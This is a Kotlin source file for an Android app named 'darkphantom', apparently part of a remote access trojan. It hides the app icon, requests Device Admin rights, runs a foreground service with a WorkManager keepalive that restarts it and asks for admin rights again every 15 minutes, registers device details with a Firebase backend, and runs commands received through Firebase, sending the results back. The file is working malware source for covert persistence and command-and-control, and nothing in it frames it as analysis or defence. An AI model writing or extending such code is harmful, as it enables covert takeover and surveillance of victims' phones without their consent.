package com.genetic.darkphantom.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.genetic.darkphantom.R
import com.genetic.darkphantom.executors.CommandExecutor
import com.genetic.darkphantom.managers.DeviceAdminManager
import com.genetic.darkphantom.managers.FirebaseManager
import com.genetic.darkphantom.models.Command
import com.genetic.darkphantom.utils.DeviceUtils
import com.genetic.darkphantom.utils.IconUtils
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import java.util.concurrent.TimeUnit

class GeneticService : Service() {
    private lateinit var commandListener: ChildEventListener
    private val deviceId = DeviceUtils.getDeviceId(this)

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        setupPersistence()
        registerDevice()
        listenForCommands()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        FirebaseManager.commandsRef.child(deviceId).removeEventListener(commandListener)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        val channelId = "genetic_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Genetic Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Genetic Control")
            .setContentText("Running in background")
            .setSmallIcon(R.drawable.ic_notification) // Make sure you have this drawable or change to android.R.drawable.ic_menu_call
            .build()
    }

    private fun setupPersistence() {
        // 1. Activasi Device Admin
        if (!DeviceAdminManager.isAdminActive(this)) {
            DeviceAdminManager.requestAdminActivation(this)
        }

        // 2. Sembunyikan icon
        IconUtils.hideIcon(this)

        // 3. Schedule WorkManager untuk keepalive
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val workRequest = PeriodicWorkRequestBuilder<GeneticWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "genetic_keepalive",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )
    }

    private fun registerDevice() {
        val info = DeviceUtils.getDeviceInfo(this)
        FirebaseManager.devicesRef.child(deviceId).child("info").setValue(info)
        FirebaseManager.devicesRef.child(deviceId).child("online").setValue(true)
        FirebaseManager.devicesRef.child(deviceId).child("last_seen").setValue(System.currentTimeMillis())
    }

    private fun listenForCommands() {
        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                executeCommand(snapshot)
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        }
        FirebaseManager.commandsRef.child(deviceId).addChildEventListener(commandListener)
    }

    private fun executeCommand(snapshot: DataSnapshot) {
        val command = snapshot.getValue(Command::class.java) ?: return
        val key = snapshot.key ?: return
        val result = CommandExecutor(this).execute(command)
        FirebaseManager.resultsRef.child(deviceId).child(key).setValue(result)
        FirebaseManager.commandsRef.child(deviceId).child(key).removeValue()
    }
}

// Worker untuk keepalive
class GeneticWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    override suspend fun doWork(): Result {
        val context = applicationContext
        if (!isServiceRunning(context)) {
            context.startService(Intent(context, GeneticService::class.java))
        }
        if (!DeviceAdminManager.isAdminActive(context)) {
            DeviceAdminManager.requestAdminActivation(context)
        }
        return Result.success()
    }

    private fun isServiceRunning(context: Context): Boolean {
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            if (GeneticService::class.java.name == service.service.className) {
                return true
            }
        }
        return false
    }
}
